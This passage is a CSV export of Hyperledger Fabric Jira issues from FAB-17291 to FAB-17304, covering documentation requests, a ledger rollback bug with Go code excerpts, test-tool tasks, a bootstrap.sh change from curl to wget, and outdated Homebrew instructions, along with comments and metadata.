information),btl5037,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,release-1.4,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Command reference: peer chaincode page missing install example syntax,FAB-17291,43786,,Documentation,Backlog,FAB,Fabric,software,denyeart,,,Low,,,heatherp,heatherp,20/Dec/19 10:37 PM,09/Feb/21 12:24 AM,28/Oct/23 3:09 AM,,v1.4.5,,,,,,,,,,,,,fabric-docs,,,,,,,,,0,1.4,peerCLI,,,,"[https://hyperledger-fabric.readthedocs.io/en/release-1.4/commands/peerchaincode.html|https://hyperledger-fabric.readthedocs.io/en/release-1.4/commands/peerchaincode.html#peer-chaincode-upgrade]

All the commands except the install command have example syntax, can we add an install example too?

No relevant for the v2.0 release of course.",,heatherp,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i016sb:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),heatherp,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"""disable gossip"" causes peer blocks out of sync with the orderer.",FAB-17292,43788,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,rameshthoomu,rameshthoomu,21/Dec/19 4:30 AM,17/Apr/21 12:37 AM,28/Oct/23 3:09 AM,17/Apr/21 12:37 AM,v1.4.2,,,,,,,,,v1.4.2,,,,fabric-orderer,,,,,,,,,0,,,,,,"Make sure the fabric network is configured with gossipDisable. See the config here https://github.com/hyperledger/fabric-test/blob/release-1.4/tools/operator/testdata/kafka-couchdb-tls-network-spec.yml#L22

Make sure kafka to raft migration is done

Once the migration is done, send invoke transactions from PTE tool.

Observed below error  after migration is completed from kafka(v2.2.2) to raft on fabric 1.4.2 code base. Please see the attached orderer log files.

Tested above test case on multiple kafka versions (1.1.1 and 2.2.2) with fabric 1.4.2 and 1.4.4 code base. Below are my findings.

Observed blocks are creating for the transactions we are sending from the PTE tool but noticed ""unreceived events"" in the PTE log.

`CONSTANT INVOKE Overall event: received 0 timeout 0 *unreceived 80*`

""eventOpt"": {
 ""type"": ""FilteredBlock"",
 ""listener"": ""Block"",

I see there is no communication between Orderer and Peer. So the peer is unable to fetch the block information from Orderer.

 

Not observed this issue in master branch with the same configuration.

 

 ",,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"21/Dec/19 4:30 AM;rameshthoomu;ordere0.log;https://jira.hyperledger.org/secure/attachment/18050/ordere0.log","21/Dec/19 4:30 AM;rameshthoomu;orderer.log;https://jira.hyperledger.org/secure/attachment/18049/orderer.log","21/Dec/19 4:30 AM;rameshthoomu;peer0.log;https://jira.hyperledger.org/secure/attachment/18048/peer0.log",,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i016sj:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
synchronize problem of  blockfile and pvtdata,FAB-17293,43789,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,manish-sethi,luckyrobinson,luckyrobinson,21/Dec/19 10:57 AM,16/Feb/20 3:55 AM,28/Oct/23 3:09 AM,16/Feb/20 3:55 AM,,,,,,,,,,v1.4.5,,,,fabric-ledger,,,,,,,,,0,,,,,,"fabric version release-1.4,

in function func (mgr *blockfileMgr) addBlock(block *common.Block) , as code follows,

//save the index in the database
 if err = mgr.index.indexBlock(&blockIdxInfo{
 blockNum: block.Header.Number, blockHash: blockHash,
 flp: blockFLP, txOffsets: txOffsets, metadata: block.Metadata}); err != nil {
     return err
 }

if write indexdatabase failed, code just return error message, but not use the function like mgr.currentFileWriter.truncateFile to rollback the blockfile.

in the function func (s *Store) CommitWithPvtData(blockAndPvtdata *ledger.BlockAndPvtData) , as code follows,

if err := s.AddBlock(blockAndPvtdata.Block); err != nil {
 s.pvtdataStore.Rollback()
 return err
 }

when err is not nil, the function s.pvtdataStore.Rollback() delete the pendingCommitKey from the pvtdatabase, but not delete the pvtdata inserted into the database in function Prepare.

if now the fabric system meets the coredump for some reason like power failure. restarting the fabric will meets the error as height not equals of blockfile and pvtdatabase

 ",,luckyrobinson,manish-sethi,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|hzwr6z:zz6xi",,,,Unset,Unset,v1.4.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),luckyrobinson,manish-sethi,yacovm,,,,,,,,,,,,release-1.4,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"23/Dec/19 4:06 AM;yacovm;[~manish-sethi] ;;;","07/Jan/20 11:39 AM;manish-sethi;Thanks [~luckyrobinson] to bring this up. This logic was completely removed in master. There was a discussion whether we should have removed this in 1.4 itself but then was deferred to 2.0 ([https://gerrit.hyperledger.org/r/#/c/fabric/+/32449/2/core/ledger/ledgerstorage/store.go@348|https://gerrit.hyperledger.org/r/#/c/fabric/+/32449/2/core/ledger/ledgerstorage/store.go@348).])

Still, to minimize the changes in 1.4, we can simply remove this line - [https://github.com/hyperledger/fabric/blob/a8639bacd3e3516ee77fad3bdf00110710ae7cd9/core/ledger/ledgerstorage/store.go#L146|https://github.com/hyperledger/fabric/blob/a8639bacd3e3516ee77fad3bdf00110710ae7cd9/core/ledger/ledgerstorage/store.go#L146)]

 

[~Senthil1] - wdyt?;;;","25/Jan/20 6:18 AM;manish-sethi;https://github.com/hyperledger/fabric/pull/547;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add kafka version to network spec templates.,FAB-17294,43791,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,rameshthoomu,rameshthoomu,rameshthoomu,24/Dec/19 2:41 AM,11/Jan/21 2:31 AM,28/Oct/23 3:09 AM,11/Jan/21 2:31 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"In fabric network spec templates, currently we don't have an option to provide kafka version, because of this the orderer is taking the default kafka version though the kafka version is upgraded to the latest one in 0.4.18 kafka tag.

We have to provide an option to choose whatever the kafka version user want to use.",,btl5037,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i016t7:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"10/Jan/20 6:16 AM;rameshthoomu;https://github.com/hyperledger/fabric-test/pull/42;;;","11/Jan/21 2:08 AM;btl5037;As part of backlog grooming closing issue as stale. Issue can be reopened in the future.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update fabric-test Makefile script to sync with thirdparty docker images as in fabric repo,FAB-17295,43792,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid,btl5037,rameshthoomu,rameshthoomu,24/Dec/19 2:50 AM,16/Jun/20 11:16 AM,28/Oct/23 3:09 AM,16/Jun/20 11:16 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"Update fabric-test Makefile script to sync with thirdparty docker images as in fabric repo. The current Makefile in fabric-test master branch is pulling thirdparty images from Hyperledger Dockerhub but fabric master branch is pulling from the source of these images. 

Update fabric-test makefile to keep these changes in sync with fabric.",,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i016tf:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"21/Jan/20 6:13 AM;rameshthoomu;https://github.com/hyperledger/fabric-test/pull/45;;;","01/Feb/20 12:05 AM;rameshthoomu;Assigning this to [~btl5037] 

 ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Use wget for bootstrap.sh,FAB-17297,43812,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,btl5037,btl5037,btl5037,31/Dec/19 4:27 PM,02/Jan/20 5:12 PM,28/Oct/23 3:09 AM,02/Jan/20 5:12 PM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,"bootstrap.sh currently uses curl to download the fabric binaries. For developers in regions not located near GitHub's CDN network curl's socket tends to break and the reconnection is not handled gracefully. Historically there was complex logic to handle the reconnection, instead of reintroducing the complex logic, a simpler solution would be to simply use wget which handles the reconnection for you ",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i016vv:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Cryptogen and certificate management documentation ,FAB-17298,43813,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,datocrats-org,datocrats-org,31/Dec/19 8:19 PM,10/Jan/20 7:33 AM,28/Oct/23 3:09 AM,10/Jan/20 7:33 AM,,,,,,,,,,,,,,fabric-ca,fabric-docs,,,,,,,,0,,,,,,"Certificates are key pre-requisite to fabric, so the build your first network or similar documentation needs more platform-specific configuration info and environment-specific discussion on certificate lifecycle management. 

More instructions for the reference cryptogen tool and its [documentation | [https://hyperledger-fabric.readthedocs.io/en/release-1.4/commands/cryptogen.html]|https://hyperledger-fabric.readthedocs.io/en/release-1.4/commands/cryptogen.html] are needed:

Add platform-specific instructions on when and how to add cryptogen to the path given that the bootstrap.sh script is omitting this step.  See [Stack Overflow|[https://stackoverflow.com/questions/45033956/how-do-i-resolve-the-error-on-hyperledger-fabric]]. byfn.sh is failing on Windows without adding cryptogen to the path manually.

Describe certificate generation tasks in more detail, weighing production-ready options against the cryptogen approach for development purposes.  Current documentation does not suggest using cryptogen in production environments. See [cryptogen documentation | [https://hyperledger-fabric.readthedocs.io/en/release-1.4/commands/cryptogen.html]]",,datocrats-org,joe-alewine,pandrejko,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i016w3:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),datocrats-org,joe-alewine,pandrejko,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"07/Jan/20 6:47 AM;pandrejko;[~negupta][~joe-alewine] FYI -;;;","07/Jan/20 11:14 AM;joe-alewine;I would be against adding too much more information about cryptogen to the docs (other than clarifying a necessary step for launching a network, as in your Windows example), other perhaps than to reiterate that it's not only not for production, but that even in development environments it obscures processes that are vital to understand. Over and over again we see people having issues with their certificates. It makes us wonder how much of that is due to the desire to spin networks up quickly using a tool like cryptogen that glosses over the first few steps in network building.

If all you're interested in is developing smart contracts, then cryptogen is a valid tool to use to help spin up a network. But if that's all you need your network for — as a tool for testing your smart contract — why do you need to learn more about cryptogen?

This isn't necessarily a door we should be opening and explaining, even if we're just going to shut it again.;;;","10/Jan/20 7:33 AM;pandrejko;Agreed. We really don't want users running cryptogen at this point. Users really need to understand the Fabric CA. I'm closing this issue for now but if you disagree, please feel free to re-open ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Adjust lifecycle support to support collection level endorsement policies,FAB-17299,43814,43754,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,caod,yacovm,yacovm,03/Jan/20 12:02 AM,16/Apr/20 3:53 AM,28/Oct/23 3:09 AM,16/Apr/20 3:53 AM,,,,,,,,,,v2.1.0,,,,fabric-ledger,fabric-peer,,,,,,,,0,,,,,,"The discovery/support/chaincode package currently has the following function:

{code}
func (s *DiscoverySupport) PoliciesByChaincode(channel string, cc string, _ ...string) []policies.InquireablePolicy {
	chaincodeData := s.ci.Metadata(channel, cc, false)
	if chaincodeData == nil {
		logger.Info(""Chaincode"", cc, ""wasn't found"")
		return nil
	}
	pol := &common2.SignaturePolicyEnvelope{}
	if err := proto.Unmarshal(chaincodeData.Policy, pol); err != nil {
		logger.Warning(""Failed unmarshaling policy for chaincode"", cc, "":"", err)
		return nil
	}
	if len(pol.Identities) == 0 || pol.Rule == nil {
		logger.Warningf(""Invalid policy, either Identities(%v) or Rule(%v) are empty:"", pol.Identities, pol.Rule)
		return nil
	}
	return []policies.InquireablePolicy{inquire.NewInquireableSignaturePolicy(pol)}
}
{code}

We need to adjust it to return several endorsement policies in case we have a collection level endorsement policy among the given collections. ",,caod,yacovm,,,,,,,,,,,,,,,,,,,,FAB-17308,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i016wb:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,yacovm,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"09/Jan/20 4:12 AM;caod;[https://github.com/hyperledger/fabric/pull/472];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Removing TLS option from operator/testclient tool,FAB-17300,43815,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,bharadwajambati1,bharadwajambati1,bharadwajambati1,03/Jan/20 1:40 AM,29/Jan/20 1:01 PM,28/Oct/23 3:09 AM,22/Jan/20 3:20 AM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-quality,,,,,,,,,0,,,,,,,,bharadwajambati1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzx8r",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),bharadwajambati1,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,release-1.4,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"03/Jan/20 4:48 AM;bharadwajambati1;[https://github.com/hyperledger/fabric-test/pull/22/commits/b2b6bd56360f1e99bdeb7f78de7218a1f9a47355];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add information on how to build fabric docs locally,FAB-17301,43816,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,negupta,negupta,negupta,03/Jan/20 4:50 AM,07/Jan/20 6:46 AM,28/Oct/23 3:09 AM,07/Jan/20 6:46 AM,,,,,,,,,,v2.0.0,,,,fabric-docs,,,,,,,,,0,,,,,,"You can find this information in a README in the docs folder, but I expected this information in the contribution guide in the main docs.",,negupta,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i016wj:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),negupta,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"03/Jan/20 6:19 AM;negupta;https://github.com/hyperledger/fabric/pull/446;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add CTE package to fabric-ca,FAB-17302,43818,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,dereckluo,dereckluo,04/Jan/20 12:24 AM,22/Jan/20 12:27 AM,28/Oct/23 3:09 AM,22/Jan/20 12:27 AM,,,,,,,,,,,,,,fabric-ca,fabric-quality,,,,,,,,0,,,,,,Adding CTE package and any useful parts of the Makefile/Readme information to fabric-ca repo.,,dereckluo,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-16897,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i016wz:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),dereckluo,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Reasonable defaults for org-specific implicit collection dissemination properties,FAB-17303,43819,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,caod,denyeart,denyeart,04/Jan/20 6:05 AM,11/Feb/20 4:01 AM,28/Oct/23 3:09 AM,28/Jan/20 10:20 AM,,,,,,,,,,v2.0.0,,,,fabric-ledger,fabric-peer,,,,,,,,0,,,,,,"Org-specific implicit collections are used by v2.0 lifecycle, and can also be used by user chaincodes. Traditional collections allow for configuration properties such as *requiredPeerCount* and *maxPeerCount* to specify private data dissemination behavior, for example to require that private data has been disseminated for redundancy as a condition for successful endorsement. 

Without an ability to configure properties on implicit private data collections in v2.0, we'll have to live with reasonable defaults. This story will update the defaults for explicitly defined collections and implicit collections to be:
requiredPeerCount = 0
maxPeerCount = 1",,caod,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17463,FAB-17491,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-10889,,,No,,Unset,No,,,"1|i008rj:iwrz",,,,Unset,Unset,v2.0,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,denyeart,,,,,,,,,,,,,dependabot/bundler/docs/nokogiri-1.14.3,0.2.x,0.1.x,main,dependabot/go_modules/golang.org/x/net-0.7.0,release-2.0,dependabot/go_modules/golang.org/x/text-0.3.8,dependabot/bundler/docs/commonmarker-0.23.9,mergify/bp/release-2.2/pr-3750,dependabot/go_modules/bindings/go-apiv2/golang.org/x/net-0.7.0,release-2.3,release-2.2,release-2.5,release-2.4,dependabot/go_modules/bindings/go-apiv2/golang.org/x/sys-0.1.0,dependabot/go_modules/golang.org/x/sys-0.1.0,mergify/bp/release-2.2/pr-4374,dependabot/bundler/docs/activesupport-6.0.6.1,dependabot/go_modules/bindings/go-apiv1/golang.org/x/text-0.3.8,dependabot/go_modules/bindings/go-apiv1/golang.org/x/net-0.7.0,dependabot/go_modules/bindings/go-apiv2/golang.org/x/text-0.3.8,github-settings,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,dependabot/go_modules/bindings/go-apiv1/golang.org/x/sys-0.1.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"14/Jan/20 6:31 AM;caod;https://github.com/hyperledger/fabric/pull/550 merged in master.
https://github.com/hyperledger/fabric/pull/568 merged in release-2.0.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Homebrew Fabric instructions are wrong,FAB-17304,43821,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,ryjones,ryjones,ryjones,05/Jan/20 2:34 AM,02/May/20 6:40 PM,28/Oct/23 3:09 AM,02/May/20 6:40 PM,,,,,,,,,,,,,,fabric-quality,homebrew-fabric,,,,,,,,0,ipm2,,,,,"[These instructions talk about Nexus and Gerrit|https://github.com/hyperledger/homebrew-fabric/blob/master/Formula/README.md].",,btl5037,denyeart,ryjones,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i016xn:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,denyeart,ryjones,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"08/Feb/20 4:24 AM;denyeart;[~ChristopherFerris] [~btl5037] Do you see value in continuing to support fabric-homebrew? If so, we should cleanup and add to release process.;;;","26/Apr/20 1:53 PM;btl5037;I wanted to archive it when we migrated to Azure. Gari had mentioned he wanted to keep it around at the time, but that may not be the case anymore.


 [~mastersingh24] is there something here you still want to maintain, or can we archive it? Looking at the repo Insights, it has about as close to zero traffic as you can have without it actually being zero.;;;","02/May/20 6:39 PM;ryjones;this specific issue is fixed; the question of ""should homebrew fabric continue"" is distinct;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
